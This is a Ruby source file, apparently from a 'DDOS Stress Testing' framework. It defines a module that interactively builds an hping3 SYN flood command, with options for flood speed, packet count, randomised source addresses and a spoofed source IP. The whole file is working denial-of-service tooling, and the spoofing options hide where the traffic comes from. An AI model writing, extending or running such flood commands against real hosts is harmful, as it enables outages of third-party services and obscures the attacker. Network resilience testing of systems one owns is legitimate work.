require 'highline/import'

# Module to hold DDOS Stress Testing
module DDOSFramework
  # Module to contain flood attack vectors
  module Flood
    # Module to contain SYN flood attack vectors
    module Syn
      # Module to contain the Tsunami varient of SYN flood attack vectors
      module Tsunami
        def self.create
          command = 'hping3'

          # Verbose?
          verbose_choice = DDOSFramework::Flood.verbose?
          # Set verbosity flag
          command += ' --verbose' if verbose_choice

          # How fast?
          predefined_speed_choice = DDOSFramework::Flood.predefined_speed?
          speed = DDOSFramework::Flood.predefined_speed if \
            (%w(fast faster flood).include?(speed)) || \
            (predefined_speed_choice == true)
          microsecond_speed = DDOSFramework::Flood.microsecond_speed unless (['fast', 'faster', 'flood'].include?(speed)) || (predefined_speed_choice == true)
          # Set speed flag(s)
          command += " --#{speed}" if ['fast', 'faster', 'flood'].include?(speed)
          command += " --interval u#{microsecond_speed}" unless ['fast', 'faster', 'flood'].include?(speed)

          # How Many?
          count = DDOSFramework::Flood.packet_count unless predefined_speed_choice
          # Set count flag
          command += " --count #{count}" if count

          # From Who?
          random_sources = DDOSFramework::Flood.random_source_ip?
          spoof_ip_choice = DDOSFramework::Flood.spoof_source_ip? unless random_sources
          spoofed_ip = DDOSFramework::Flood.spoofed_source_ip if random_sources == false && spoof_ip_choice
          # Set source flag(s) as necessary
          command += ' --rand-source' if random_sources
          command += " --spoof #{spoofed_ip}" if spoof_ip_choice

          # Return the command
          command
        end
      end
    end
  end
end
